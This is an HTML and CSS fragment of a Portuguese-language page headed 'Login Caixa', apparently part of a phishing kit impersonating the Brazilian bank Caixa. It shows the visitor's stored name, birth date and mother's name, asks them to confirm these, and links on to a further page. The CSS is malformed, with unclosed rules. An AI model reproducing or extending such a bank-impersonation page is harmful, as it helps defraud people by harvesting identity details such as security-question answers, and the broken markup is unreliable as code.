      body {
        font-family: 'Futura-Book' !important;

      .container-bg {
        background: linear-gradient(45deg, #00a9ad, #005ca9);
        background-size: 100%;
        background-repeat: no-repeat;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;

      .container-principal {
        height: auto;
        margin: 0 auto;

      .container-principal h1 {

      .container-principal h3 {
        color: #0070ae;
        font-size: 1rem;
        margin-top: 1.1rem;

        color: white;

        <h1>Login Caixa</h1>
        <h2>Para continuar, confirme se os seus dados estão corretos.</h2>

        <h2>Nome:</h2>
        <form>
          <input type="radio" checked>
          <label id="nomeLabel">Carregando...</label><br>
        </form>

        <h2>Data de nascimento:</h2>
        <form>
          <input type="radio" checked disabled>
          <label id="nascimentoLabel">Carregando...</label><br>
        </form>

        <h2>Nome da mãe:</h2>
        <form>
          <input type="radio" checked disabled>
          <label id="nome_maeLabel">Carregando...</label><br>
        </form>

        <div class="botoes w-100 d-flex flex-column justify-content-center align-items-center">
          <a href="/cartelas.html"><button>Sim, sou eu</button></a>
          <a href="../1"><button class="btn-nao">Quero alterar meus dados</button></a>
        </div>

        <h3><a href="">Preciso de ajuda</a></h3>
      </div>
    </div>

    <script>
      document.addEventListener('DOMContentLoaded', function () {
        const nome = localStorage.getItem('nome');
        const nascimento = localStorage.getItem('nascimento');
        const nome_mae = localStorage.getItem('nome_mae');

        if (nome) {
          document.getElementById('nomeLabel').textContent = nome;
        }

        if (nascimento) {
          document.getElementById('nascimentoLabel').textContent = nascimento;
        }

        if (nome_mae) {
          document.getElementById('nome_maeLabel').textContent = nome_mae;
        }
      });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
  </body>
